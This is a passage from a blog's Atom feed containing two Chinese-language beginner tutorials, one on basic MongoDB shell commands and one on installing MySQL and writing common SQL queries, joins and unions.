      <category term="JavaScript" scheme="http://yoursite.com/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>MongoDB学习from菜鸟教程</title>
    <link href="http://yoursite.com/2018/03/12/MongoDB%E5%AD%A6%E4%B9%A0from%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/"/>
    <id>http://yoursite.com/2018/03/12/MongoDB学习from菜鸟教程/</id>
    <published>2018-03-12T05:12:29.000Z</published>
    <updated>2018-03-12T07:31:14.101Z</updated>
    
    <content type="html"><![CDATA[<p>在学习<a href="https://github.com/nswbmw/N-blog" target="_blank" rel="noopener">《一起学 Node.js》</a>中，需要使用 Express + MongoDB 搭建多人博客，因此在<a href="http://www.runoob.com/mongodb/mongodb-tutorial.html" target="_blank" rel="noopener">菜鸟MongoDB 教程</a>上学习总结MongoDB的基本用法。<br><a id="more"></a><br>MongoDB是一个基于分布式文件存储的开源数据库系统。 在高负载的情况下，添加更多的节点，可以保证服务器性能, 为WEB应用提供可扩展的高性能数据存储解决方案。<br>MongoDB 将数据存储为一个文档，数据结构由键值(key=&gt;value)对组成。 MongoDB 文档类似于 JSON 对象。 字段值可以包含其他文档，数组及文档数组。<br>mongodb中基本的概念是文档、集合、数据库。一个mongodb中可以建立多个数据库。MongoDB的默认数据库为”db”，该数据库存储在data目录中。</p>
<p>MongoDB的单个实例可以容纳多个独立的数据库，每一个都有自己的集合和权限，不同的数据库也放置在不同的文件中。</p>
<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><p>先cd到bin文件夹下，执行”mongo”启动客户端。<br>(1)<code>show dbs</code> 命令可以显示所有数据的列表。</p>
<pre><code>&gt; show dbs
admin   0.000GB
config  0.000GB
local   0.000GB
</code></pre><p>(2)<code>db</code> 命令可以显示当前数据库对象或集合。</p>
<pre><code>&gt; db
test
</code></pre><p>(3)<code>use database_name</code>命令，可以连接到一个指定的数据库。</p>
<pre><code>&gt; use local
switched to db local
&gt; db
local
</code></pre><p>(4)<strong>数据库名命名规则：</strong>可以是满足以下条件的任意UTF-8字符串。</p>
<pre><code>不能是空字符串（&quot;&quot;)。
不得含有&apos; &apos;（空格)、.、$、/、\和\0 (空字符)。
应全部小写。
最多64字节
</code></pre><p>有一些数据库名是保留的，可以直接访问这些有特殊作用的数据库。</p>
<pre><code>admin： 从权限的角度来看，这是&quot;root&quot;数据库。要是将一个用户添加到这个数据库，这个用户自动继承所有数据库的权限。一些特定的服务器端命令也只能从这个数据库运行，比如列出所有的数据库或者关闭服务器。
local: 这个数据永远不会被复制，可以用来存储限于本地单台服务器的任意集合
config: 当Mongo用于分片设置时，config数据库在内部使用，用于保存分片的相关信息。
</code></pre><p><strong>(5)文档</strong><br>文档是一组键值(key-value)对(即BSON)。MongoDB 的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，这与关系型数据库有很大的区别，也是 MongoDB 非常突出的特点。一个简单的文档如下所示：</p>
<pre><code>{&quot;site&quot;:&quot;www.runoob.com&quot;, &quot;name&quot;:&quot;菜鸟教程&quot;}

文档中的键/值对是有序的。
文档中的值不仅可以是在双引号里面的字符串，还可以是其他几种数据类型（甚至可以是整个嵌入的文档)。
MongoDB区分类型和大小写。
MongoDB的文档不能有重复的键。
文档的键是字符串。除了少数例外情况，键可以使用任意UTF-8字符。
</code></pre><p>文档键命名规范：</p>
<pre><code>键不能含有\0 (空字符)。这个字符用来表示键的结尾。
.和$有特别的意义，只有在特定环境下才能使用。
以下划线&quot;_&quot;开头的键是保留的(不是严格要求的)。
</code></pre><p><strong>(6)集合</strong><br>集合就是 MongoDB 文档组，类似于 RDBMS （关系数据库管理系统：Relational Database Management System)中的表格。<br>集合存在于数据库中，集合没有固定的结构，这意味着你在对集合可以插入不同格式和类型的数据，但通常情况下我们插入集合的数据都会有一定的关联性。<br>可以将以下不同数据结构的文档插入到集合中：</p>
<pre><code>{&quot;site&quot;:&quot;www.baidu.com&quot;}
{&quot;site&quot;:&quot;www.google.com&quot;,&quot;name&quot;:&quot;Google&quot;}
{&quot;site&quot;:&quot;www.runoob.com&quot;,&quot;name&quot;:&quot;菜鸟教程&quot;,&quot;num&quot;:5}
</code></pre><p>集合名命名规范：</p>
<pre><code>集合名不能是空字符串&quot;&quot;。
集合名不能含有\0字符（空字符)，这个字符表示集合名的结尾。
集合名不能以&quot;system.&quot;开头，这是为系统集合保留的前缀。
用户创建的集合名字不能含有保留字符。有些驱动程序的确支持在集合名里面包含，这是因为某些系统生成的集合中包含该字符。除非你要访问这种系统创建的集合，否则千万不要在名字里出现$。
</code></pre><p>Capped collections 就是固定大小的collection。<br><strong>(7)元数据</strong><br>数据库的信息是存储在集合中。它们使用了系统的命名空间：<code>dbname.system.*</code></p>
<h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><p><code>use DATABASE_NAME</code> 如果数据库不存在，则创建数据库，否则切换到指定数据库。</p>
<pre><code>&gt; use test
switched to db test
&gt; db
test
&gt; show dbs
admin   0.000GB
config  0.000GB
local   0.000GB
</code></pre><p>刚创建的test数据库不在数据库列表中，要显示它，必须插入一些数据。</p>
<pre><code>&gt; db.test.insert({&quot;name&quot;:&quot;hello&quot;})
WriteResult({ &quot;nInserted&quot; : 1 })
&gt; show dbs
admin   0.000GB
config  0.000GB
local   0.000GB
test    0.000GB
</code></pre><p>MongoDB 中默认的数据库为 test，如果你没有创建新的数据库，集合将存放在 test 数据库中。</p>
<h2 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h2><p>先切换到要删除的数据库，再执行<code>db.dropDatabase()</code></p>
<pre><code>&gt; use test
switched to db test
&gt; db
test
&gt; db.dropDatabase()
{ &quot;dropped&quot; : &quot;test&quot;, &quot;ok&quot; : 1 }
&gt; show dbs
admin   0.000GB
config  0.000GB
local   0.000GB
</code></pre><p>关于MongoDB更详细的操作命令见菜鸟教程。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在学习&lt;a href=&quot;https://github.com/nswbmw/N-blog&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;《一起学 Node.js》&lt;/a&gt;中，需要使用 Express + MongoDB 搭建多人博客，因此在&lt;a href=&quot;http://www.runoob.com/mongodb/mongodb-tutorial.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;菜鸟MongoDB 教程&lt;/a&gt;上学习总结MongoDB的基本用法。&lt;br&gt;
    
    </summary>
    
      <category term="MongoDB" scheme="http://yoursite.com/categories/MongoDB/"/>
    
    
      <category term="MongoDB" scheme="http://yoursite.com/tags/MongoDB/"/>
    
  </entry>
  
  <entry>
    <title>MySQL数据库的安装及基本的使用方法</title>
    <link href="http://yoursite.com/2018/03/09/MySQL-install-and-usage/"/>
    <id>http://yoursite.com/2018/03/09/MySQL-install-and-usage/</id>
    <published>2018-03-09T02:37:30.000Z</published>
    <updated>2018-03-10T03:32:39.183Z</updated>
    
    <content type="html"><![CDATA[<p>关于MySQL数据库基本的安装和操作方法。<a href="http://www.runoob.com/mysql/mysql-tutorial.html" target="_blank" rel="noopener">MySQL教程–菜鸟</a>。<br><a id="more"></a></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装步骤可参考博客<a href="http://blog.csdn.net/pansanday/article/details/51321178" target="_blank" rel="noopener">mysql数据库下载、安装、使用</a>前部分，我选择安装的是MySQL Server组件，其他基本照着默认方式就好了。</p>
<h2 id="基本的使用方法"><a href="#基本的使用方法" class="headerlink" title="基本的使用方法"></a>基本的使用方法</h2><p>参考博客<a href="http://blog.csdn.net/whq19890827/article/details/48752517" target="_blank" rel="noopener"> MySql基本使用方法 </a>。</p>
<h3 id="1．显示当前数据库服务器中的数据库列表"><a href="#1．显示当前数据库服务器中的数据库列表" class="headerlink" title="1．显示当前数据库服务器中的数据库列表"></a>1．显示当前数据库服务器中的数据库列表</h3><p><code>mysql&gt; SHOW DATABASES;</code></p>
<pre><code>mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
</code></pre><h3 id="2-显示某个数据库中的数据"><a href="#2-显示某个数据库中的数据" class="headerlink" title="2.显示某个数据库中的数据"></a>2.显示某个数据库中的数据</h3><pre><code>mysql&gt; USE 库名；//使用某个库
mysql&gt; SHOW TABLES；//列出库中所有的表
</code></pre><h3 id="3-显示数据表的结构"><a href="#3-显示数据表的结构" class="headerlink" title="3.显示数据表的结构"></a>3.显示数据表的结构</h3><pre><code>mysql&gt; DESCRIBE 表名；
</code></pre><h3 id="4-建立数据库"><a href="#4-建立数据库" class="headerlink" title="4.建立数据库"></a>4.建立数据库</h3><p> <code>mysql&gt; CREATE DATABASE 库名；</code> 例如新建一个名为test的数据库，再查看下数据库列表，多了个新的test数据库</p>
<pre><code>mysql&gt; CREATE DATABASE test;
Query OK, 1 row affected (0.01 sec)

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| test               |
+--------------------+
</code></pre><h3 id="5-建立数据表"><a href="#5-建立数据表" class="headerlink" title="5.建立数据表"></a>5.建立数据表</h3><pre><code>mysql&gt; USE 库名;
mysql&gt; CREATE TABLE 表名 (字段名 VARCHAR(20), 字段名 CHAR(1))；
//CREATE TABLE table_name (column_name column_type);
</code></pre><p>新建一个名为Websites的数据表，字段值分别为id, name, url, alexa, country。关于MySQL建表字段的类型参考博客<a href="http://blog.sina.com.cn/s/blog_80613dc40100s0c8.html" target="_blank" rel="noopener">MySQL建表字段类型</a>。</p>
<pre><code>mysql&gt; CREATE TABLE Websites(id int,name varchar(18),url varchar(100),alexa int,country varchar(18));
Query OK, 0 rows affected (0.04 sec)
</code></pre><h3 id="6-删除数据库"><a href="#6-删除数据库" class="headerlink" title="6.删除数据库"></a>6.删除数据库</h3><p> <code>mysql&gt; DROP DATABASE 库名；</code></p>
<h3 id="7-删除数据表"><a href="#7-删除数据表" class="headerlink" title="7.删除数据表"></a>7.删除数据表</h3><p><code>mysql&gt; DROP TABLE 表名;</code></p>
<h3 id="8-将表中记录清空"><a href="#8-将表中记录清空" class="headerlink" title="8.将表中记录清空"></a>8.将表中记录清空</h3><p> <code>mysql&gt; DELETE FROM 表名;</code></p>
<h3 id="9-显示表中的所有记录"><a href="#9-显示表中的所有记录" class="headerlink" title="9.显示表中的所有记录"></a>9.显示表中的所有记录</h3><p> <code>mysql&gt; SELECT * FROM 表名;</code></p>
<h3 id="10-往表中插入记录"><a href="#10-往表中插入记录" class="headerlink" title="10.往表中插入记录"></a>10.往表中插入记录</h3><p> <code>mysql&gt; INSERT INTO 表名 VALUES (&quot;hyq&quot;,&quot;M&quot;);</code><br>往名为Websites的表中插入第一条记录，各字段值分别为：<code>id=1,name=&quot;Google&quot;,url=&quot;https://www.google.com/&quot;, alexa=1,country=&quot;USA&quot;</code>。然后查看添加记录后表中的记录显示如下所示：</p>
<pre><code>mysql&gt; INSERT INTO Websites VALUES (1,&quot;Google&quot;,&quot;https://www.google.com/&quot;,1,&quot;USA&quot;);
Query OK, 1 row affected (0.02 sec)

mysql&gt; SELECT * FROM Websites;
+------+--------+-------------------------+-------+---------+
| id   | name   | url                     | alexa | country |
+------+--------+-------------------------+-------+---------+
|    1 | Google | https://www.google.com/ |     1 | USA     |
+------+--------+-------------------------+-------+---------+
</code></pre><p>添加完菜鸟教程中SQL示例代码数据表中的5条示例记录后，Websites数据表显示如下：</p>
<pre><code>mysql&gt; SELECT * FROM Websites;
+------+--------------+--------------------------+-------+---------+
| id   | name         | url                      | alexa | country |
+------+--------------+--------------------------+-------+---------+
|    1 | Google       | https://www.google.com/  |     1 | USA     |
|    2 | 淘宝         | https://www.taobao.com/  |    13 | CN      |
|    3 | 菜鸟教程     | http://www.runoob.com     |  4689 | CN      |
|    4 | 微博         | http://weibo.com         |    20 | CN      |
|    5 | Facebook     | http://www.facebook.com/ |     3 | USA     |
+------+--------------+--------------------------+-------+---------+
</code></pre><h3 id="11-更新表中数据"><a href="#11-更新表中数据" class="headerlink" title="11.更新表中数据"></a>11.更新表中数据</h3><p> <code>mysql-&gt; UPDATE 表名 SET 字段名1=&#39;a&#39;,字段名2=&#39;b&#39; WHERE 字段名3=&#39;c&#39;；</code></p>
<h3 id="12-用文本方式将数据装入数据表中"><a href="#12-用文本方式将数据装入数据表中" class="headerlink" title="12.用文本方式将数据装入数据表中"></a>12.用文本方式将数据装入数据表中</h3><p> <code>mysql&gt; LOAD DATA LOCAL INFILE &quot;D:/mysql.txt&quot; INTO TABLE 表名;</code></p>
<p>###13.导入.sql文件命令 ###</p>
<pre><code>mysql&gt; USE 数据库名;
mysql&gt; SOURCE d:/mysql.sql;
</code></pre><h3 id="14-显示正在use的数据库名"><a href="#14-显示正在use的数据库名" class="headerlink" title="14.显示正在use的数据库名"></a>14.显示正在use的数据库名</h3><p> <code>mysql&gt; SELECT DATABASE();</code><br>如下所示，在新建的test数据库中建立的Websites数据表，因此正在使用的数据库是test。</p>
<pre><code>mysql&gt; SELECT DATABASE();
+------------+
| DATABASE() |
+------------+
| test       |
+------------+
</code></pre><h3 id="15-显示当前的user"><a href="#15-显示当前的user" class="headerlink" title="15.显示当前的user"></a>15.显示当前的user</h3><p> <code>mysql&gt; SELECT USER();</code></p>
<pre><code>mysql&gt; SELECT USER();
+----------------+
| USER()         |
+----------------+
| root@localhost |
+----------------+
</code></pre><h3 id="16-SELECT-TOP-子句"><a href="#16-SELECT-TOP-子句" class="headerlink" title="16.SELECT TOP 子句"></a>16.SELECT TOP 子句</h3><p>返回规定的记录数目。MySQL语法如下：</p>
<pre><code>SELECT column_name(s)
FROM table_name
LIMIT number;
</code></pre><p>从 “Websites” 表中选取头两条记录如下：</p>
<pre><code>mysql&gt; SELECT * FROM Websites
    -&gt; LIMIT 2;
+------+--------+-------------------------+-------+---------+
| id   | name   | url                     | alexa | country |
+------+--------+-------------------------+-------+---------+
|    1 | Google | https://www.google.com/ |     1 | USA     |
|    2 | 淘宝   | https://www.taobao.com/ |    13 | CN      |
+------+--------+-------------------------+-------+---------+
</code></pre><h3 id="17-LIKE-操作符"><a href="#17-LIKE-操作符" class="headerlink" title="17.LIKE 操作符"></a>17.LIKE 操作符</h3><p>LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式。语法如下：</p>
<pre><code>SELECT column_name(s)
FROM table_name
WHERE column_name LIKE pattern;
</code></pre><p>以下示例选取 name 以字母 “G” 开始的所有记录：</p>
<pre><code>mysql&gt; SELECT * FROM Websites
    -&gt; WHERE name LIKE &quot;G%&quot;;
+------+--------+-------------------------+-------+---------+
| id   | name   | url                     | alexa | country |
+------+--------+-------------------------+-------+---------+
|    1 | Google | https://www.google.com/ |     1 | USA     |
</code></pre><p>以下示例选取 name 以字母 “k” 结尾的所有客户：</p>
<pre><code>mysql&gt; SELECT * FROM Websites
    -&gt; WHERE name LIKE &quot;%k&quot;;
+------+----------+--------------------------+-------+---------+
| id   | name     | url                      | alexa | country |
+------+----------+--------------------------+-------+---------+
|    5 | Facebook | http://www.facebook.com/ |     3 | USA     |
+------+----------+--------------------------+-------+---------+
</code></pre><p>以下示例选取 name 包含模式 “oo” 的所有记录：</p>
<pre><code>mysql&gt; SELECT * FROM Websites
    -&gt; WHERE name LIKE &quot;%oo%&quot;;
+------+----------+--------------------------+-------+---------+
| id   | name     | url                      | alexa | country |
+------+----------+--------------------------+-------+---------+
|    1 | Google   | https://www.google.com/  |     1 | USA     |
|    5 | Facebook | http://www.facebook.com/ |     3 | USA     |
+------+----------+--------------------------+-------+---------+
</code></pre><p>注意：”%” 符号用于在模式的前后定义通配符（缺省字母），通配符可用于替代字符串中的任何其他字符。 通配符与 SQL LIKE 操作符一起使用。</p>
<pre><code>%                          替代 0 个或多个字符
_                          替代一个字符
[charlist]                 字符列中的任何单一字符
[^charlist]或[!charlist]   不在字符列中的任何单一字符
</code></pre><p>搭配以上通配符可以让LIKE命令实现多种技巧：</p>
<pre><code>1、LIKE&apos;Mc%&apos; 将搜索以字母 Mc 开头的所有字符串（如 McBadden）。
2、LIKE&apos;%inger&apos; 将搜索以字母 inger 结尾的所有字符串（如 Ringer、Stringer）。
3、LIKE&apos;%en%&apos; 将搜索在任何位置包含字母 en 的所有字符串（如 Bennet、Green、McBadden）。
4、LIKE&apos;_heryl&apos; 将搜索以字母 heryl 结尾的所有六个字母的名称（如 Cheryl、Sheryl）。
5、LIKE&apos;[CK]ars[eo]n&apos; 将搜索下列字符串：Carsen、Karsen、Carson 和 Karson（如 Carson）。
6、LIKE&apos;[M-Z]inger&apos; 将搜索以字符串 inger 结尾、以从 M 到 Z 的任何单个字母开头的所有名称（如 Ringer）。
7、LIKE&apos;M[^c]%&apos; 将搜索以字母 M 开头，并且第二个字母不是 c 的所有名称（如MacFeather）。
</code></pre><h3 id="18-charlist-通配符"><a href="#18-charlist-通配符" class="headerlink" title="18.[charlist] 通配符"></a>18.[charlist] 通配符</h3><p>MySQL 中使用 REGEXP 或 NOT REGEXP 运算符 (或 RLIKE 和 NOT RLIKE) 来操作正则表达式。<br>下面的 SQL 语句选取 name 以 “G”、”F” 或 “s” 开始的所有网站：</p>
<pre><code>mysql&gt; SELECT * FROM Websites
    -&gt; WHERE name REGEXP &quot;^[GFs]&quot;;
+------+---------------+----------------------------+-------+---------+
| id   | name          | url                        | alexa | country |
+------+---------------+----------------------------+-------+---------+
|    1 | Google        | https://www.google.com/    |     1 | USA     |
|    5 | Facebook      | http://www.facebook.com/   |     3 | USA     |
|    6 | stackoverflow | https://stackoverflow.com/ |     0 | IND     |
+------+---------------+----------------------------+-------+---------+
</code></pre><h3 id="19-IN-操作符"><a href="#19-IN-操作符" class="headerlink" title="19.IN 操作符"></a>19.IN 操作符</h3><p>IN 操作符允许在 WHERE 子句中规定多个值，然后返回规定相应的记录。语法如下：</p>
<pre><code>SELECT column_name(s)
FROM table_name
WHERE column_name IN (value1,value2,...);
</code></pre><p>以下语句选取 name 为 “Google” 或 “菜鸟教程” 的所有记录：</p>
<pre><code>mysql&gt; SELECT * FROM Websites
    -&gt; WHERE name IN (&quot;Google&quot;,&quot;菜鸟教程&quot;);
+------+--------------+-------------------------+-------+---------+
| id   | name         | url                     | alexa | country |
+------+--------------+-------------------------+-------+---------+
|    1 | Google       | https://www.google.com/ |     1 | USA     |
|    3 | 菜鸟教程     | http://www.runoob.com   |  4689 | CN      |
+------+--------------+-------------------------+-------+---------+
</code></pre><p><strong>IN 与 = 的异同</strong>：<br>    相同点：均在WHERE中使用作为筛选条件之一、均是等于的含义<br>    不同点：IN可以规定多个值，等于规定一个值</p>
<h3 id="20-BETWEEN-操作符"><a href="#20-BETWEEN-操作符" class="headerlink" title="20.BETWEEN 操作符"></a>20.BETWEEN 操作符</h3><p>用于选取介于两个值之间的数据范围内的值。这些值可以是数值、文本或者日期。 语法如下：</p>
<pre><code>SELECT column_name(s)
FROM table_name
WHERE column_name BETWEEN value1 AND value2;
</code></pre><p>以下语句选取 alexa 介于 1 和 20 之间的所有记录：</p>
<pre><code>mysql&gt; SELECT * FROM Websites
    -&gt; WHERE alexa BETWEEN 1 AND 20;
+------+----------+--------------------------+-------+---------+
| id   | name     | url                      | alexa | country |
+------+----------+--------------------------+-------+---------+
|    1 | Google   | https://www.google.com/  |     1 | USA     |
|    2 | 淘宝     | https://www.taobao.com/  |    13 | CN      |
|    4 | 微博     | http://weibo.com         |    20 | CN      |
|    5 | Facebook | http://www.facebook.com/ |     3 | USA     |
+------+----------+--------------------------+-------+---------+
</code></pre><p>NOT BETWEEN 显示不在范围内的所有记录。<br>以下语句语句选取alexa介于 1 和 20 之间但 country 不为 USA 和 IND 的所有记录：</p>
<pre><code>mysql&gt; SELECT * FROM Websites
    -&gt; WHERE alexa BETWEEN 1 AND 20
    -&gt; AND NOT country IN (&quot;USA&quot;,&quot;IND&quot;);
+------+--------+-------------------------+-------+---------+
| id   | name   | url                     | alexa | country |
+------+--------+-------------------------+-------+---------+
|    2 | 淘宝   | https://www.taobao.com/ |    13 | CN      |
|    4 | 微博   | http://weibo.com        |    20 | CN      |
+------+--------+-------------------------+-------+---------+
</code></pre><h3 id="21-连接-JOIN"><a href="#21-连接-JOIN" class="headerlink" title="21.连接(JOIN)"></a>21.连接(JOIN)</h3><p>参考<a href="http://www.runoob.com/sql/sql-join.html" target="_blank" rel="noopener">SQL 连接(JOIN)</a>。<br>用于把来自两个或多个表的行结合起来。基于这些表之间的共同字段。<br>最常见的 JOIN 类型：SQL <strong>INNER JOIN</strong>（简单的 JOIN）。<br>SQL INNER JOIN 从多个表中返回满足 JOIN 条件的所有行。<br>“Websites” 表中的 “id” 列指向 “<code>access_log</code>“ 表中的字段 “<code>site_id</code>“。将这两个表是通过 “<code>site_id</code>“ 列联系起来的。</p>
<pre><code>mysql&gt; SELECT Websites.id, Websites.name, access_log.count, access_log.date
    -&gt; FROM Websites
    -&gt; INNER JOIN access_log
    -&gt; ON Websites.id=access_log.site_id;
+------+--------------+-------+------------+
| id   | name         | count | date       |
+------+--------------+-------+------------+
|    1 | Google       |    45 | 2016-05-10 |
|    3 | 菜鸟教程     |   100 | 2016-05-13 |
|    1 | Google       |   230 | 2016-05-14 |
|    2 | 淘宝         |    10 | 2016-05-14 |
|    5 | Facebook     |   205 | 2016-05-14 |
|    4 | 微博         |    13 | 2016-05-15 |
|    3 | 菜鸟教程     |   220 | 2016-05-15 |
|    5 | Facebook     |   545 | 2016-05-16 |
|    3 | 菜鸟教程     |   201 | 2016-05-17 |
+------+--------------+-------+------------+
</code></pre><p>不同的 SQL JOIN：</p>
<pre><code>INNER JOIN：如果表中有至少一个匹配，则返回行
LEFT JOIN：即使右表中没有匹配，也从左表返回所有的行
RIGHT JOIN：即使左表中没有匹配，也从右表返回所有的行
FULL JOIN：只要其中一个表中存在匹配，则返回行
</code></pre><p>首先，连接的结果可以在逻辑上看作是由SELECT语句指定的列组成的新表。<br>左连接与右连接的左右指的是以两张表中的哪一张为基准，它们都是外连接。<br>外连接就好像是为非基准表添加了一行全为空值的万能行，用来与基准表中找不到匹配的行进行匹配。假设两个没有空值的表进行左连接，左表是基准表，左表的所有行都出现在结果中，右表则可能因为无法与基准表匹配而出现是空值的字段。</p>
<h3 id="22-INNER-JOIN"><a href="#22-INNER-JOIN" class="headerlink" title="22.INNER JOIN"></a>22.INNER JOIN</h3><p>在表中存在至少一个匹配时返回行。语法如下：</p>
<pre><code>SELECT column_name(s)
FROM table1
INNER JOIN table2
ON table1.column_name=table2.column_name;
</code></pre><p>或：</p>
<pre><code>SELECT column_name(s)
FROM table1
JOIN table2
ON table1.column_name=table2.column_name;
</code></pre><p><img src="http://www.runoob.com/wp-content/uploads/2013/09/img_innerjoin.gif" alt="inner join"><br>具体例子如21所示。<br>注释：INNER JOIN 与 JOIN 是相同的<br>注释：INNER JOIN 关键字在表中存在至少一个匹配时返回行。如果 “Websites” 表中的行在 “<code>access_log</code>“ 中没有匹配，则不会列出这些行。</p>
<h3 id="23-LEFT-JOIN"><a href="#23-LEFT-JOIN" class="headerlink" title="23.LEFT JOIN"></a>23.LEFT JOIN</h3><p>从左表（table1）返回所有的行，即使右表（table2）中没有匹配。如果右表中没有匹配，则结果为 NULL。语法如下：</p>
<pre><code>SELECT column_name(s)
FROM table1
LEFT JOIN table2
ON table1.column_name=table2.column_name;
</code></pre><p>或：</p>
<pre><code>SELECT column_name(s)
FROM table1
LEFT OUTER JOIN table2
ON table1.column_name=table2.column_name;
// 在某些数据库中，LEFT JOIN 称为 LEFT OUTER JOIN。
</code></pre><p><img src="http://www.runoob.com/wp-content/uploads/2013/09/img_leftjoin.gif" alt="left join"></p>
<p>以下示例语句将返回所有网站及他们的访问量（如果有的话）。把 Websites 作为左表，<code>access_log</code> 作为右表：</p>
<pre><code>mysql&gt; SELECT Websites.id, Websites.name, access_log.count, access_log.date
    -&gt; FROM Websites
    -&gt; LEFT JOIN access_log
    -&gt; ON Websites.id=access_log.site_id
    -&gt; ORDER BY access_log.count DESC;
+------+---------------+-------+------------+
| id   | name          | count | date       |
+------+---------------+-------+------------+
|    5 | Facebook      |   545 | 2016-05-16 |
|    1 | Google        |   230 | 2016-05-14 |
|    3 | 菜鸟教程      |   220 | 2016-05-15 |
|    5 | Facebook      |   205 | 2016-05-14 |
|    3 | 菜鸟教程      |   201 | 2016-05-17 |
|    3 | 菜鸟教程      |   100 | 2016-05-13 |
|    1 | Google        |    45 | 2016-05-10 |
|    4 | 微博          |    13 | 2016-05-15 |
|    2 | 淘宝          |    10 | 2016-05-14 |
|    6 | stackoverflow |  NULL | NULL       |
+------+---------------+-------+------------+
</code></pre><h3 id="24-FULL-OUTER-JOIN"><a href="#24-FULL-OUTER-JOIN" class="headerlink" title="24.FULL OUTER JOIN"></a>24.FULL OUTER JOIN</h3><p>FULL OUTER JOIN 关键字只要左表（table1）和右表（table2）其中一个表中存在匹配，则返回行。<br>FULL OUTER JOIN 关键字结合了 LEFT JOIN 和 RIGHT JOIN 的结果。<br>FULL OUTER JOIN 关键字返回左表（Websites）和右表（<code>access_log</code>）中所有的行。如果 “Websites” 表中的行在 “<code>access_log</code>“ 中没有匹配或者 “<code>access_log</code>“ 表中的行在 “Websites” 表中没有匹配，也会列出这些行。<br>语法如下：</p>
<pre><code>SELECT column_name(s)
FROM table1
FULL OUTER JOIN table2
ON table1.column_name=table2.column_name;
</code></pre><p><img src="http://www.runoob.com/wp-content/uploads/2013/09/img_fulljoin.gif" alt="full outer join"></p>
<p><strong>注意：</strong> MySQL中不支持 FULL OUTER JOIN，可以在 SQL Server 测试实例。</p>
<h3 id="25-UNION"><a href="#25-UNION" class="headerlink" title="25.UNION"></a>25.UNION</h3><p>用于合并两个或多个 SELECT 语句的结果。<br>注意： UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。<br>语法如下：<br>    SELECT column_name(s) FROM table1<br>    UNION<br>    SELECT column_name(s) FROM table2;<br>注释：(1) 默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。<br>(2) UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</p>
<pre><code>mysql&gt;  SELECT country FROM Websites
    -&gt; UNION
    -&gt; SELECT country FROM apps
    -&gt; ORDER BY country;
+---------+
| country |
+---------+
| CN      |
| IND     |
| USA     |
+---------+
</code></pre><p>注释：UNION 不能用于列出两个表中所有的country。如果一些网站和APP来自同一个国家，每个国家只会列出一次。UNION 只会选取不同的值。请使用 UNION ALL 来选取重复的值！<br>使用UNION命令时需要注意，只能在最后使用一个ORDER BY命令，是将两个查询结果合在一起之后，再进行排序！绝对不能写两个ORDER BY命令。</p>
<h3 id="26-INSERT-INTO-SELECT-SELECT-INTO"><a href="#26-INSERT-INTO-SELECT-SELECT-INTO" class="headerlink" title="26.INSERT INTO SELECT / SELECT INTO"></a>26.INSERT INTO SELECT / SELECT INTO</h3><p>从一个表复制信息插入到另一个已存在的表，目标表中任何已存在的行都不会受影响。。<br><strong>注意：</strong>MySQL 数据库不支持 SELECT … INTO 语句，但支持 INSERT INTO … SELECT 。<br>以使用以下语句来拷贝表结构及数据：<code>CREATE TABLE 新表 SELECT * FROM 旧表;</code><br>语法如下：</p>
<pre><code>INSERT INTO table2
SELECT * FROM table1;
</code></pre><p>或者只复制希望的列插入到另一个已存在的表中：</p>
<pre><code>INSERT INTO table2
(column_name(s))
SELECT column_name(s)
FROM table1;
</code></pre><p>以下语句复制 “apps” 中的数据插入到 “Websites” 中：</p>
<pre><code>mysql&gt; INSERT INTO Websites(name,country)
    -&gt; SELECT app_name,country FROM apps
    -&gt; WHERE id=1;
Query OK, 1 row affected (0.01 sec)

mysql&gt; SELECT * FROM Websites;
+------+---------------+----------------------------+-------+---------+
| id   | name          | url                        | alexa | country |
+------+---------------+----------------------------+-------+---------+
|    1 | Google        | https://www.google.com/    |     1 | USA     |
|    2 | 淘宝          | https://www.taobao.com/    |    13 | CN      |
|    3 | 菜鸟教程      | http://www.runoob.com      |  4689 | CN      |
|    4 | 微博          | http://weibo.com           |    20 | CN      |
|    5 | Facebook      | http://www.facebook.com/   |     3 | USA     |
|    6 | stackoverflow | https://stackoverflow.com/ |     0 | IND     |
| NULL | QQ APP        | NULL                       |  NULL | CN      |
+------+---------------+----------------------------+-------+---------+
</code></pre><p>表apps中的数据如下：</p>
<pre><code>mysql&gt; SELECT * FROM apps;
+------+------------+------------------------+---------+
| id   | app_name   | url                    | country |
+------+------------+------------------------+---------+
|    1 | QQ APP     | http://im.qq.com/      | CN      |
|    2 | 微博 APP   | http://weibo.com/      | CN      |
|    3 | 淘宝 APP   | http://www.taobao.com/ | CN      |
+------+------------+------------------------+---------+
</code></pre><h3 id="27-约束（Constraints）"><a href="#27-约束（Constraints）" class="headerlink" title="27.约束（Constraints）"></a>27.约束（Constraints）</h3><p>SQL 约束用于规定表中的数据规则。<br>如果存在违反约束的数据行为，行为会被约束终止。<br>约束可以在创建表时规定（通过 CREATE TABLE 语句），或者在表创建之后规定（通过 ALTER TABLE 语句）。语法如下：</p>
<pre><code>CREATE TABLE table_name
(
column_name1 data_type(size) constraint_name,
column_name2 data_type(size) constraint_name,
column_name3 data_type(size) constraint_name,
....
);
</code></pre><p>在 SQL 中，有如下约束：</p>
<pre><code>NOT NULL - 指示某列不能存储 NULL 值。
UNIQUE - 保证某列的每行必须有唯一的值。
